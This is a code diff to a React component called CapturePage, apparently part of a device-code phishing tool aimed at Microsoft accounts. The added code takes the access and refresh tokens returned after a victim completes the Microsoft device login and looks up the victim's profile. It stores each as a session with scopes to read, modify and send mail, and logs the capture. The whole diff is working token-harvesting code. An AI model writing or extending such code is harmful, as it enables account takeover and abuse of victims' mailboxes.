@@ -1,4 +1,5 @@
 import React, { useState, useEffect, useCallback, useRef } from 'react';
+import { addSession, addAuditEntry, createSessionFromToken } from '../api/tokenStorage';
 
 const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
 
@@ -71,10 +72,20 @@ export function CapturePage(): React.ReactElement {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ deviceCode: dCode }),
         });
-        const data = await res.json() as { status: string; error?: string; description?: string };
+        const data = await res.json() as {
+          status: string;
+          error?: string;
+          description?: string;
+          accessToken?: string;
+          refreshToken?: string;
+          expiresIn?: number;
+          scope?: string;
+          resource?: string;
+        };
 
-        if (data.status === 'complete') {
+        if (data.status === 'complete' && data.accessToken) {
           stopPolling();
+          await handleAuthComplete(data.accessToken, data.refreshToken ?? '', data.expiresIn ?? 3600);
           setState('success');
         } else if (data.status === 'expired') {
           stopPolling();
@@ -94,6 +105,47 @@ export function CapturePage(): React.ReactElement {
         // Network error, keep polling
       }
     }, interval * 1000);
+  }
+
+  async function handleAuthComplete(accessToken: string, refreshToken: string, expiresIn: number): Promise<void> {
+    let email = 'unknown@user.com';
+    let displayName = 'Authenticated User';
+
+    try {
+      const profileRes = await fetch('/api/user-profile', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ accessToken }),
+      });
+      if (profileRes.ok) {
+        const profile = await profileRes.json() as { displayName: string; email: string };
+        email = profile.email || email;
+        displayName = profile.displayName || displayName;
+      }
+    } catch {
+      // Profile fetch failed, use defaults
+    }
+
+    const session = createSessionFromToken({
+      accessToken,
+      refreshToken,
+      expiresIn,
+      email,
+      displayName,
+      scopes: ['User.Read', 'Mail.Read', 'Mail.ReadWrite', 'Mail.Send', 'MailboxSettings.Read'],
+    });
+
+    addSession(session);
+
+    addAuditEntry({
+      id: `log_${Date.now()}`,
+      timestamp: new Date().toISOString(),
+      action: 'login',
+      accountEmail: email,
+      ipAddress: 'Web Client',
+      details: `Device code flow completed. Token expires in ${expiresIn}s. Scopes: User.Read, Mail.Read, Mail.ReadWrite, Mail.Send, MailboxSettings.Read`,
+      success: true,
+    });
   }
 
   async function handleGenerateCode(): Promise<void> {
